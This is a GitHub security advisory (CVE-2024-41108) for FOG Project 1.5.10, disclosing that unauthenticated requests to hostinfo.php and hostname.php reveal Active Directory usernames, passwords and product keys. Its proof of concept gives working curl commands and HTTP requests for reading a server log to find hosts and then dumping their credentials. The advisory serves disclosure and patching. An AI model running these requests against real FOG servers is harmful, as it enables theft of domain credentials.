
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fsecurity%2Fadvisories%2FGHSA-p3f9-4jj4-fm2g)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fsecurity%2Fadvisories%2FGHSA-p3f9-4jj4-fm2g)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=FOGProject%2Ffogproject)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FOGProject](/FOGProject)
/
**[fogproject](/FOGProject/fogproject)**
Public

* [Notifications](/login?return_to=%2FFOGProject%2Ffogproject) You must be signed in to change notification settings
* [Fork
  227](/login?return_to=%2FFOGProject%2Ffogproject)
* [Star
   1.2k](/login?return_to=%2FFOGProject%2Ffogproject)

* [Code](/FOGProject/fogproject)
* [Issues
  45](/FOGProject/fogproject/issues)
* [Pull requests
  3](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects
  0](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

Additional navigation options

* [Code](/FOGProject/fogproject)
* [Issues](/FOGProject/fogproject/issues)
* [Pull requests](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

# Sensitive Information Disclosure

High

[mastacontrola](/mastacontrola)
published
GHSA-p3f9-4jj4-fm2g
Jul 31, 2024

## Package

FOG

## Affected versions

1.5.10

## Patched versions

1.5.10.41

## Description

### Summary

Missing access control allows attackers to obtain sensitive information.

### Details

The hostinfo page has missing/improper access control since only the host's mac address is required to obtain the configuration information. This data can only be retrieved if a task is pending on that host. Otherwise, an error message containing "Invalid tasking!" will be returned. The domainpassword in the hostinfo dump is hidden even to authenticated users, as it is displayed as a row of asterisks when navigating to the host's Active Directory settings.

<https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/service/hostinfo.php>

The same can be done on the hostname page to obtain the ADPassLegacy.

<https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/service/hostname.php>

[fogproject/packages/web/lib/client/hostnamechanger.class.php](https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/client/hostnamechanger.class.php#L111-L165)

Lines 111 to 165
in
[a4bb1bf](/FOGProject/fogproject/commit/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f)

|  | public function send() |
| --- | --- |
|  | { |
|  | ob\_start(); |
|  | echo '#!ok'; |
|  | $password = self::$Host->get('ADPassLegacy'); |
|  | printf( |
|  | "=%s\n", |
|  | self::$Host->get('name') |
|  | ); |
|  | self::$Host->setAD(); |
|  | $username = trim( |
|  | self::$Host->get('ADUser') |
|  | ); |
|  | if (strpos($username, chr(92)) |
|  | || strpos($username, chr(64)) |
|  | ) { |
|  | $adUser = $username; |
|  | } elseif ($username) { |
|  | $adUser = sprintf( |
|  | '%s\%s', |
|  | self::$Host->get('ADDomain'), |
|  | $username |
|  | ); |
|  | } else { |
|  | $adUser = ''; |
|  | } |
|  | $AD = (bool)self::$Host->get('useAD'); |
|  | $hostname = self::$Host->get('name'); |
|  | $ADDom = ''; |
|  | $ADOU = ''; |
|  | $ADUser = ''; |
|  | $ADPass = ''; |
|  | if ($AD === true) { |
|  | $AD = 1; |
|  | $ADDom = self::$Host->get('ADDomain'); |
|  | $ADOU = str\_replace( |
|  | ';', |
|  | '', |
|  | self::$Host->get('ADOU') |
|  | ); |
|  | $ADUser = $adUser; |
|  | $ADPass = $password; |
|  | } |
|  | self::$Host->setAD(); |
|  | printf( |
|  | "#AD=%s\n#ADDom=%s\n#ADOU=%s\n#ADUser=%s\n#ADPass=%s", |
|  | $AD, |
|  | $ADDom, |
|  | $ADOU, |
|  | $ADUser, |
|  | $ADPass |
|  | ); |
|  | $this->send = ob\_get\_clean(); |
|  | } |
|  | } |

### PoC

**/fog/service/hostinfo.php**

There are two requirements in order to obtain sensitive information like Active Directory credentials from the "/fog/service/hostinfo.php" page. The first step is to obtain a fogclient's mac address or hostname by any means. The easiest method I found was to use the logtoview page and specifically request the "/var/log/fog/fogscheduler.log" file which contains the hostnames of devices which has recieved a task.

`curl -i -s -k -X $'POST' --data-binary $'file=/var/log/fog/fogscheduler.log&ip=<BASE64_SERVERIP>' $'http://<SERVERIP>/fog/status/logtoview.php'`

HTTP Response:

```
HTTP/1.1 200 OK
[SNIPPED]
Content-Length: 1306

"[11-11-23 1:51:35 pm] * 2 tasks found.\n[11-11-23 1:51:35 pm] * 0 scheduled task(s) to run.\n[11-11-23 1:51:35 pm] * 2 power management task(s) to run.\n[11-11-23 1:51:35 pm] * Power Management Task run time: Sat, 11 Nov 2023 14:00:00 +0000\n[11-11-23 1:51:35 pm] * This is a cron style task that should not run now..\n[11-11-23 1:51:35 pm] * Power Management Task run time: Sat, 11 Nov 2023 13:51:00 +0000\n[11-11-23 1:51:35 pm] * This is a cron style task that should run now..\n[11-11-23 1:51:35 pm] * Found a wake on lan task that should run.\n[11-11-23 1:51:35 pm] | Task sent to testhost\n[11-11-23 1:52:35 pm] * Sending 1 wake on lan request.\n[11-11-23 1:52:35 pm] * 1 total mac attempting to wake up.\n[11-11-23 1:52:35 pm] * 2 tasks found.\n[11-11-23 1:52:35 pm] * 0 scheduled task(s) to run.\n[11-11-23 1:52:35 pm] * 2 power management task(s) to run.\n[11-11-23 1:52:35 pm] * Power Management Task run time: Sat, 11 Nov 2023 14:00:00 +0000\n[11-11-23 1:52:35 pm] * This is a cron style task that should not run now..\n[11-11-23 1:52:35 pm] * Power Management Task run time: Sat, 11 Nov 2023 13:52:00 +0000\n[11-11-23 1:52:35 pm] * This is a cron style task that should run now..\n[11-11-23 1:52:35 pm] * Found a wake on lan task that should run.\n[11-11-23 1:52:35 pm] | Task sent to testhost"

```

Both values can be verified using the following requests:

**hostname verification**

HTTP Request:

```
GET /fog/service/hostnameloop.php?host=dGVzdGhvc3Q= HTTP/1.1
Host: <SERVERIP>
Content-Length: 0
Connection: close

```

HTTP Response:

```
HTTP/1.1 200 OK
[SNIPPED]
Content-Length: 86

	A host with that name already exists	The primary mac associated is: aa:aa:aa:aa:aa:aa

```

**mac verification**

HTTP Request:

```
GET /fog/service/blame.php?mac=aa:aa:aa:aa:aa:aa HTTP/1.1
Host: <SERVERIP>
Content-Length: 0
Connection: close

```

Has Pending Task HTTP Response:

```
HTTP/1.1 200 OK
[SNIPPED]
Content-Length: 2

##

```

No Pending Tasks HTTP Response:

```
HTTP/1.1 200 OK
[SNIPPED]
Content-Length: 59

No Active Task found for Host: testhost (aa:aa:aa:aa:aa:aa)

```

The second requirement is that the target host needs to have a pending task or else no data will be returned. If both of these conditions are met, an unauthenticated user can obtain AD credentials, among other things, by running the following curl command.

`curl -i -s -k -X $'GET' -H 'User-Agent:' $'http://<SERVERIP>/fog/service/hostinfo.php?mac=aa:aa:aa:aa:aa:aa'`

HTTP Response:

```
HTTP/1.1 200 OK
Date: Sat, 11 Nov 2023 11:22:18 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Frame-Options: sameorigin
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
Content-Security-Policy: default-src 'none';script-src 'self' 'unsafe-eval';connect-src 'self';img-src 'self' data:;style-src 'self' 'unsafe-inline';font-src 'self';
Vary: Accept-Encoding
Connection: close
Transfer-Encoding: chunked
Content-Type: text/plain;charset=UTF-8

[[ -z $mac ]] && export mac='aa:aa:aa:aa:aa:aa'
[[ -z $ftp ]] && export ftp='<SERVERIP>'
[[ -z $osid ]] && export osid=''
[[ -z $storage ]] && export storage='<SERVERIP>:/images/'
[[ -z $storageip ]] && export storageip='<SERVERIP>'
[[ -z $img ]] && export img=''
[[ -z $imgFormat ]] && export imgFormat=''
[[ -z $imgType ]] && export imgType=''
[[ -z $imgPartitionType ]] && export imgPartitionType=''
[[ -z $imgid ]] && export imgid=''
[[ -z $PIGZ_COMP ]] && export PIGZ_COMP='-'
[[ -z $shutdown ]] && export shutdown='0'
[[ -z $hostearly ]] && export hostearly='1'
[[ -z $pct ]] && export pct='7'
[[ -z $ignorepg ]] && export ignorepg='1'
[[ -z $winuser ]] && export winuser=''
[[ -z $port ]] && export port=''
[[ -z $fdrive ]] && export fdrive=''
[[ -z $hostname ]] && export hostname='testhost'
[[ -z $hostdesc ]] && export hostdesc='testhost'
[[ -z $hostip ]] && export hostip=''
[[ -z $hostimageid ]] && export hostimageid='0'
[[ -z $hostbuilding ]] && export hostbuilding='0'
[[ -z $hostusead ]] && export hostusead=''
[[ -z $hostaddomain ]] && export hostaddomain='domain.local'
[[ -z $hostaduser ]] && export hostaduser='aduser'
[[ -z $hostadpass ]] && export hostadpass='aduserpassword'
[[ -z $hostadou ]] && export hostadou='domainOU'
[[ -z $hostproductkey ]] && export hostproductkey='WINDO-WSPRO-DUCTK-EY'
[[ -z $imagename ]] && export imagename=''
[[ -z $imagedesc ]] && export imagedesc=''
[[ -z $imageosid ]] && export imageosid=''
[[ -z $imagepath ]] && export imagepath=''
[[ -z $primaryuser ]] && export primaryuser=''
[[ -z $othertag ]] && export othertag=''
[[ -z $othertag1 ]] && export othertag1=''
[[ -z $sysman ]] && export sysman=''
[[ -z $sysproduct ]] && export sysproduct=''
[[ -z $sysserial ]] && export sysserial=''
[[ -z $mbman ]] && export mbman=''
[[ -z $mbserial ]] && export mbserial=''
[[ -z $mbasset ]] && export mbasset=''
[[ -z $mbproductname ]] && export mbproductname=''
[[ -z $caseman ]] && export caseman=''
[[ -z $caseserial ]] && export caseserial=''
[[ -z $caseasset ]] && export caseasset=''
[[ -z $mode ]] && export mode='checkdisk'

```

**/fog/service/hostname.php**

Run the following curl command with the mac address of an existing fogclient to obtain the ADPassLegacy value of that host.

`curl -i -s -k -X $'GET' $'http://<SERVERIP>/fog/service/hostname.php?mac=aa:aa:aa:aa:aa:aa'`

HTTP Response:

```
HTTP/1.1 200 OK
[SNIPPED]
Content-Length: 105

#!ok=testhost
#AD=1
#ADDom=domain.local
#ADOU=domainOU
#ADUser=domain.local\aduser
#ADPass=aduserpassword

```
### Impact

Anyone with network access to the fogproject web interface and basic information about the existing fogclients can obtain sensitive information.

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
None

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2024-41108

### Weaknesses

[CWE-200](/advisories?query=cwe%3A200)

### Credits

* [![@c3r3br4t3](https://avatars.githubusercontent.com/u/138821723?s=40&v=4)](/c3r3br4t3)
  [c3r3br4t3](/c3r3br4t3)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

